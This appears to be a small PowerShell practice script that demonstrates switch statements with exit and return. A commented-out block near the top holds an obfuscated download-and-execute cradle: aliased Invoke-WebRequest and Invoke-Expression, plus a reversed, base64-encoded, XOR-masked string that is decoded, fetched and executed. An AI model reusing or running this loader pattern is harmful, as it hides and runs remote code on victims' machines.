# Set-Alias -name input -val Invoke-WebRequest
# Set-Alias -name output -val Invoke-Expression

# $a = "RM0RAZ0QVMxED1BHKIFRXpgSDtAQRZFRVpgCfYVVRFVT".ToCharArray()
# [aRRaY]::reVErse($a)
# $b = [sYstEM.CoNveRt]::froMbasE64strING($a -join"")

# for ($x = 0; $x -lt $b.Count; $x++) {
#     ${B}[${x}] = ${B}[${X}] -bxor 37
# }
# Write-Host "xxx"
# $c = (input ([sySteM.tExt.EncOding]::UTF8.GetString($b))).Content
# output $c

# 1,2,3 | & {
#     process {
#         $_ * 2
#     }
# }


switch (1, 2, 3, 4, 5) {
    1 { "one" }
    2 { "two"; exit ; "This will not be executed" }
    3 { "three"; return ; "This will not be executed" }
    4 { "four" }
    5 { "five" }
}
